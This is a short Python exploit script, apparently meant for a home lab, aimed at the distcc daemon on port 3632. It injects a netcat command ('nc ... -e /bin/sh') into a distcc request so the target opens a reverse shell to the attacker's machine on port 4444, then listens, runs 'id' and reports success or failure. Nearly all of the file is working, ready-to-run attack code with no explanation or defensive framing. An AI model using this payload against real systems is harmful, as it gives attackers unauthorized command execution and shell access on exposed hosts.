import socket
import time

VICTIM_IP = "192.168.56.101"
ATTACKER_IP = "192.168.56.1"
DISTCC_PORT = 3632
REVERSE_PORT = 4444
TIMEOUT = 20  # שניות

def log(msg):
    print(f"[LOG] {msg}")

def create_distcc_payload():
    log("Building reverse shell payload...")
    cmd = "nc 192.168.56.1 4444 -e /bin/sh"
    payload = f"""DIST00000001ARGC00000005ARGV00000002shARGV00000002-cARGV0000000E{cmd}ARGV00000001--ARGV00000002-aARGV00000002-i"""
    return payload.encode()

def send_exploit():
    log(f"Connecting to distccd at {VICTIM_IP}:{DISTCC_PORT}...")
    try:
        s = socket.socket()
        s.connect((VICTIM_IP, DISTCC_PORT))
        payload = create_distcc_payload()
        log("Sending exploit payload...")
        s.send(payload)
        s.close()
        log("Exploit sent.")
    except Exception as e:
        log(f"[ERROR] Failed to send exploit: {e}")
        return False
    return True

def listen_for_shell():
    log(f"Listening on port {REVERSE_PORT} for reverse shell (timeout {TIMEOUT}s)...")
    s = socket.socket()
    s.bind(("0.0.0.0", REVERSE_PORT))
    s.listen(1)
    s.settimeout(TIMEOUT)
    try:
        conn, addr = s.accept()
        log(f"[SUCCESS] Reverse shell connected from {addr}")
        conn.send(b"id\n")
        response = conn.recv(1024).decode(errors="ignore").strip()
        log(f"[SHELL RESPONSE] {response}")
        conn.close()
        return True
    except socket.timeout:
        log("[TIMEOUT] No shell received.")
        return False
    except Exception as e:
        log(f"[ERROR] While listening: {e}")
        return False
    finally:
        s.close()

# ======= MAIN =========
log("Starting simple distccd shell check...")
if not send_exploit():
    log("[FAIL] Exploit could not be sent.")
    exit(1)

log("Waiting for possible shell...")
success = listen_for_shell()

if success:
    log("✅ ATTACK SUCCESSFUL: Reverse shell opened.")
else:
    log("❌ ATTACK FAILED: No shell received.")
